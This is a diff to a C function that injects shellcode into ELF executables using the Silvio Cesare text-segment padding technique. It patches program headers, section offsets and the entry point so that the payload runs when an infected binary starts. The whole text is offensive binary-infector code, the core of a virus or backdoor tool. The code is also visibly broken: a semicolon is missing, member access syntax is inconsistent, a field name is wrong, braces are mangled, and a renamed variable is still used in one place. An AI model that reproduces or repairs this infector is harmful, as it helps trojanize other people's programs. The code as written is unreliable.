@@ -38,17 +38,19 @@ int binject_ELF(char *file,char *shellcode,int method)
                         }
   if(method==SILVIO_METHOD)
   {
+	  sclen+=5;
+	  x=0;
 	  address+=ehdr->e_phoff
 	  for (i = 0; i < ehdr.e_phnum; i++) {
 		  struct Elf32_phdr phdr= (struct Elf32_phdr*)address;
-		if (offset) {
+		if (x) {
 			phdr->p_offset += 4096;
 		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
 			
 			ehdr.e_entry = phdr->p_vaddr+phdr->p_filesz;
 			int palen;
 
-			if (phdr->p_filesz != phdr->p_memsz) goto error;
+			if (phdr->p_filesz != phdr->p_memsz) return-1;
 
 			
 			palen = PAGE_SIZE - (ehdr.e_entry & (PAGE_SIZE - 1));
@@ -57,12 +59,10 @@ int binject_ELF(char *file,char *shellcode,int method)
 			
 
 			ehdr.e_entry = evaddr + ventry;
-			offset = phdr->p_offset + phdr->p_filesz;
+			x = phdr->p_offset + phdr->p_filesz;
 
-			phdr->p_filesz += vlen;
-			phdr->p_filesz += 5;
-			phdr->p_memsz += vlen;
-			phdr->p_memsz += 5;
+			phdr->p_filesz += sclen;
+			phdr->p_memsz += sclen;
 		}
 
 		address+=phdr->filesz;
@@ -74,20 +74,18 @@ address=file_buffer+ehdr->e_shoff;
 		struct Elf32_Shdr shdr = (struct Elf32_Shdr*)address;
 		if (shdr->sh_offset >= offset) {
 			shdr->sh_offset += PAGE_SIZE;
-		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
-			if (shdr->sh_type != SHT_PROGBITS) goto error;
+		                                } 
+		else if (shdr->sh_addr + shdr->sh_size == evaddr) {
+			if (shdr->sh_type != SHT_PROGBITS) return -1;
 
 			shdr->sh_size += sclen;
-			shdr->sh_size +=5;
-		}
+		                                                   }
 
 		address+=shdr->sh_size;
 	}
-	oshoff = ehdr.e_shoff;
-	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;
-
- 
-memcpy(file_buffer+offset,shellcodefixed,sclen);
+	if (ehdr.e_shoff >= x) 
+	ehdr.e_shoff += PAGE_SIZE;
+memcpy(file_buffer+x,shellcodefixed,sclen);
   fwrite(file_buffer,1,size,f);
   free(shellcodefixed);
   free(file_buffer);
